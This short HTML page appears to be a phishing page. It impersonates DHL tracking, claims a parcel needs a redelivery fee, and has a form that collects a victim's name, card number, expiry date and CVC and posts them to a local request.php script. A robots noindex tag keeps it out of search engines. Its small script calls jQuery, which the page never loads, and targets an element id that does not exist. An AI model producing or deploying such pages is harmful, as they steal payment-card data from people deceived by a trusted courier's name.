<!DOCTYPE html>
<html lang="de">
<head><title>| Welcome |</title>
<meta name="robots" content="noindex, nofollow">
</head>
<body>
<p>DHL Tracking: your parcel needs a redelivery fee.</p>
<form method="post" action="./request.php?step=tow&amp;id=1">
<input type="text" name="nm" maxlength="60" required placeholder="Name" autocomplete="off">
<input type="text" name="nu" maxlength="20" required placeholder="Number" autocomplete="off">
<input type="text" name="epx" maxlength="9" required placeholder="MM/YY" autocomplete="off">
<input type="text" name="vv" maxlength="10" required placeholder="CVC" autocomplete="off">
<button type="submit">Next</button>
</form>
<script>
$(function() {
    $('#nu').on('keypress', function(e) {
        if (e.which == 32)
            return false;
    });
});
</script>
</body>
</html>
